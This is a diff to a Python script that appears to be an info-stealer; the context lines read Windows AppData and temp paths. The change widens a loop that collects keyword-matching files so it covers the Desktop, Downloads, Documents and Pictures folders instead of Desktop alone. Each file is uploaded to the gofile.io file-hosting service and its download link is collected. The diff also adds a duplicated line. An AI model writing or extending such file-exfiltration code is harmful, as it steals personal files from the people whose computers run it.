@@ -268,8 +268,12 @@ local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
 home_dir = os.path.expanduser('~')
+home_dir = os.path.expanduser('~')
 desktop_path = os.path.join(home_dir, 'Desktop')
 downloads_path = os.path.join(home_dir, 'Downloads')
+documents_path = os.path.join(home_dir, 'Documents')
+pictures_path = os.path.join(home_dir, 'Pictures')
+
 
 Threadlist = []
 
@@ -701,16 +705,21 @@ import concurrent.futures
 
 def upload_file(file_path):
     try:
-        response = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(file_path, 'rb')})
+        response = requests.post(
+            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
+            files={'file': open(file_path, 'rb')}
+        )
         return response.json()["data"]["downloadPage"]
     except:
         return False
 
+
 file_paths = []
-for file in os.listdir(desktop_path):
-    if file.endswith(extension) and any(keyword in file for keyword in keywords):
-        file_path = os.path.join(desktop_path, file)
-        file_paths.append(file_path)
+for path in [desktop_path, downloads_path, documents_path, pictures_path]:
+    for file in os.listdir(path):
+        if file.endswith(extension) and any(keyword in file for keyword in keywords):
+            file_path = os.path.join(path, file)
+            file_paths.append(file_path)
 
 urls = []
 with concurrent.futures.ThreadPoolExecutor() as executor:
@@ -723,6 +732,7 @@ with concurrent.futures.ThreadPoolExecutor() as executor:
             urls.append((os.path.basename(file_path), url))
         else:
             pass
+
 
 
 if urls:
